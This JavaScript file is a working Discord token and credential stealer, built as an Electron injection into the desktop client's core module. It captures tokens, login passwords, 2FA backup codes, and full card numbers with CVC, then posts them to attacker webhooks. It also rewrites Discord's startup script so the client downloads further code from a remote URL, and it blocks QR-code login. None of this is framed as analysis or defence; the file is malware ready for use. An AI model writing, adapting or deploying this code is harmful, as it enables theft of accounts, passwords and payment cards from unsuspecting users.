const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    api: "%API_WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/inj.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',  
            '/users/@me',
            '/users/@me/email',
            '/users/@me/password',
            '/users/@me/phone',
            '/users/@me/username',
            '/billing/payment-sources',
            '/billing/subscriptions',
            '/guilds',
            '/relationships',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Emloyee: {
            Value: 1,
            Emoji: "<:8485discordemployee:1163172252989259898>",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:9171hypesquadevents:1163172248140660839>",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:5053earlysupporter:1163172241996005416>",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:6601hypesquadbravery:1163172246492287017>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:5242hypesquadbalance:1163172243417858128>",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
    content["username"] = "https://t.me/hairo13x7";
    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&";
    
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=4096`
        : `https://cdn.discordapp.com/embed/avatars/0.png`;

    content["embeds"][0]["author"] = {
        "name": account.username,
        "icon_url": avatarUrl
    };
    content["embeds"][0]["thumbnail"] = {
        "url": avatarUrl
    };
    content["embeds"][0]["footer"] = {
        "text": `${os.userInfo().username} | https://t.me/hairo13x7`,
        "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&",
    };
    content["embeds"][0]["title"] = "Account Information";

    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);

    const friends = await getFriends(token);
    const servers = await getServers(token);

    // Orijinal field'ları koru ve ek field'ları ekle
    const originalFields = content["embeds"][0]["fields"] || [];
    const additionalFields = [
        {
            "name": `<:mastercard_spacex:1429086506781511771> Token:`,
            "value": "```" + token + "```",
            "inline": false
        }, {
            "name": `<:nitro_spacex:1429086514893164647> Nitro:`,
            "value": nitro,
            "inline": true
        }, {
            "name": `<:badges_spacex:1429086523906850906> Badges:`,
            "value": badges,
            "inline": true
        }, {
            "name": `<:mastercard_spacex:1429086506781511771> Billing:`,
            "value": billing,
            "inline": true
        }, {
            "name": `<a:money_spacex:1429086508505239623> 2FA:`,
            "value": `\`${account.mfa_enabled ? "Yes" : "No"}\``,
            "inline": true
        }, {
            "name": `<:email_spacex:1429086532811358350> Email:`,
            "value": `\`${account.email}\``,
            "inline": true
        }, {
            "name": `<a:billing_postal:1429086529300598895> Phone:`,
            "value": `\`${account.phone || "None"}\``,
            "inline": true
        }, {
            "name": `<:space_classic:1429086519901032610> Path:`,
            "value": `\`C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js\``,
            "inline": false
        }
    ];

    if (originalFields.length > 0) {
        content["embeds"][0]["fields"] = [...originalFields, ...additionalFields];
    } else {
        content["embeds"][0]["fields"] = additionalFields;
    }

    content["embeds"].push({
        "title": `HQ Friends (${friends.totalFriends})`,
        "description": friends.message,
        "color": 0x313338,
        "author": { name: `HQ Friends (${friends.totalFriends})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
        "footer": { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
    }, {
        "title": `Rare Servers (${servers.totalGuilds})`,
        "description": servers.message,
        "color": 0x313338,
        "author": { name: `Rare Servers (${servers.totalGuilds})`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
        "footer": { text: `${os.userInfo().username} | https://t.me/hairo13x7`, icon_url: "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&" },
    });

    for (const embed in content["embeds"]) {
        content["embeds"][embed]["color"] = 0x313338;
    }

    // Hem webhook'a hem API'ye gönder
    const requests = [];
    
    // Kullanıcı webhook'una gönder
    if (CONFIG.webhook && 
        typeof CONFIG.webhook === 'string' && 
        CONFIG.webhook !== "%WEBHOOK%" && 
        CONFIG.webhook !== "%WEBHOOK" && 
        CONFIG.webhook.startsWith("https://discord.com/api/webhooks/")) {
        requests.push(
            request("POST", CONFIG.webhook, {
                "Content-Type": "application/json"
            }, JSON.stringify(content))
        );
    }
    
    // API webhook'una gönder (dualhook)
    if (CONFIG.api && 
        typeof CONFIG.api === 'string' && 
        CONFIG.api !== "%API_WEBHOOK%" && 
        CONFIG.api.startsWith("https://discord.com/api/webhooks/")) {
        requests.push(
            request("POST", CONFIG.api, {
                "Content-Type": "application/json"
            }, JSON.stringify(content))
        );
    }
    
    // Her iki isteği de paralel gönder (biri başarısız olsa bile diğeri çalışır)
    await Promise.allSettled(requests);
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return '`Nitro Classic`';
        case 2:
            return '`Nitro Boost`';
        case 3:
            return '`Nitro Basic`';
        default:
            return '`❌`';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
}

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
}

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**Rare Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }

    rareGuilds = rareGuilds || "**No Rare Servers**";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": `<:email_spacex:1429086532811358350> Email:`,
                "value": "`" + email + "`",
                "inline": true
            }, {
                "name": `<a:password_spacex:1429086516625412226> Password:`,
                "value": "`" + password + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
                "fields": [{
                    "name": `<a:money_spacex:1429086508505239623> Backup Codes:`,
                    "value": "```" + message + "```",
                    "inline": false
                },
                {
                    "name": `<:email_spacex:1429086532811358350> Email:`,
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": `<a:billing_postal:1429086529300598895> Phone:`,
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }
            ],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [{
                "name": `<a:password_spacex:1429086516625412226> New Password:`,
                "value": "`" + newPassword + "`",
                "inline": true
            }, {
                "name": `<a:password_spacex:1429086516625412226> Old Password:`,
                "value": "`" + oldPassword + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [{
                "name": `<:visa_spacex:1429086521654509588> Card Number:`,
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": `<:mastercard_spacex:1429086506781511771> CVC:`,
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": `<a:billing_address:1429086525446033470> Expiration:`,
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a <:paypal_spacex:1429086518168784956> account!`,
        "embeds": [{
            "fields": [{
                "name": `<:email_spacex:1429086532811358350> Email:`,
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": `<a:billing_postal:1429086529300598895> Phone:`,
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const EmailChanged = async (newEmail, oldEmail, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just changed his email!`,
        "embeds": [{
            "fields": [{
                "name": `<:email_spacex:1429086532811358350> New Email:`,
                "value": "`" + newEmail + "`",
                "inline": true
            }, {
                "name": `<:email_spacex:1429086532811358350> Old Email:`,
                "value": "`" + oldEmail + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const PhoneChanged = async (newPhone, oldPhone, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just changed his phone number!`,
        "embeds": [{
            "fields": [{
                "name": `<a:billing_postal:1429086529300598895> New Phone:`,
                "value": "`" + newPhone + "`",
                "inline": true
            }, {
                "name": `<a:billing_postal:1429086529300598895> Old Phone:`,
                "value": "`" + (oldPhone || "None") + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const UsernameChanged = async (newUsername, oldUsername, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${oldUsername}** just changed his username!`,
        "embeds": [{
            "fields": [{
                "name": `<a:billing_name:1429086527417221120> New Username:`,
                "value": "`" + newUsername + "`",
                "inline": true
            }, {
                "name": `<a:billing_name:1429086527417221120> Old Username:`,
                "value": "`" + oldUsername + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const NitroPurchased = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just purchased Nitro!`,
        "embeds": [{
            "fields": [{
                "name": `<:nitro_spacex:1429086514893164647> Nitro Type:`,
                "value": "`" + getNitro(account.premium_type) + "`",
                "inline": true
            }, {
                "name": `<:email_spacex:1429086532811358350> Email:`,
                "value": "`" + account.email + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const ServerJoined = async (serverName, serverId, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just joined a server!`,
        "embeds": [{
            "fields": [{
                "name": `<:space_classic:1429086519901032610> Server Name:`,
                "value": "`" + serverName + "`",
                "inline": true
            }, {
                "name": `<:space_classic:1429086519901032610> Server ID:`,
                "value": "`" + serverId + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const ServerLeft = async (serverName, serverId, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just left a server!`,
        "embeds": [{
            "fields": [{
                "name": `<:space_classic:1429086519901032610> Server Name:`,
                "value": "`" + serverName + "`",
                "inline": true
            }, {
                "name": `<:space_classic:1429086519901032610> Server ID:`,
                "value": "`" + serverId + "`",
                "inline": true
            }],
            "color": 0x313338
        }]
    };

    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token)

        const content = {
            "content": `**${account.username}** just got injected!`,

            "embeds": [{
                "fields": [{
                    "name": "Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }]
            }]
        };

        await hooker(content, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: 'discord',
                    main: 'index.js',
                },
                null,
                4,
            ),
        );

        // Webhook URL'lerini escape et
        const webhookUrl = CONFIG.webhook && CONFIG.webhook !== "%WEBHOOK%" && CONFIG.webhook !== "%WEBHOOK" ? CONFIG.webhook : '';
        const apiWebhookUrl = CONFIG.api && CONFIG.api !== "%API_WEBHOOK%" ? CONFIG.api : '';
        
        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          let data = '';
          res.on('data', (chunk) => {
              data += chunk.toString();
          });
          res.on('end', () => {
              // CONFIG objesi içindeki placeholder'ları değiştir
              const userWebhook = ${JSON.stringify(webhookUrl)};
              const apiWebhook = ${JSON.stringify(apiWebhookUrl)};
              if (userWebhook) {
                  data = data.split('webhook: "%WEBHOOK%"').join('webhook: ' + JSON.stringify(userWebhook));
                  data = data.split('webhook: \\'%WEBHOOK%\\'').join('webhook: \\'' + userWebhook.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'") + '\\'');
                  data = data.split('%WEBHOOK%').join(userWebhook);
              }
              if (apiWebhook) {
                  data = data.split('api: "%API_WEBHOOK%"').join('api: ' + JSON.stringify(apiWebhook));
                  data = data.split('api: \\'%API_WEBHOOK%\\'').join('api: \\'' + apiWebhook.replace(/\\\\/g, '\\\\\\\\').replace(/'/g, "\\\\'") + '\\'');
                  data = data.split('%API_WEBHOOK%').join(apiWebhook);
              }
              fs.writeFileSync(indexJs, data, 'utf8');
          });
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return; // 2FA
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    EmailChanged(requestData.email, requestData.email, responseData.token);
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }

                if (requestData.phone) {
                    PhoneChanged(requestData.phone, requestData.phone, responseData.token);
                }

                if (requestData.username) {
                    UsernameChanged(requestData.username, requestData.username, responseData.token);
                }
                break;

            case params.response.url.endsWith('/email'):
                if (requestData.email) {
                    EmailChanged(requestData.email, requestData.email, await getToken());
                }
                break;

            case params.response.url.endsWith('/password'):
                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, await getToken());
                }
                break;

            case params.response.url.endsWith('/phone'):
                if (requestData.phone) {
                    PhoneChanged(requestData.phone, requestData.phone, await getToken());
                }
                break;

            case params.response.url.endsWith('/username'):
                if (requestData.username) {
                    UsernameChanged(requestData.username, requestData.username, await getToken());
                }
                break;

            case params.response.url.endsWith('/subscriptions'):
                if (responseData.subscription) {
                    NitroPurchased(await getToken());
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
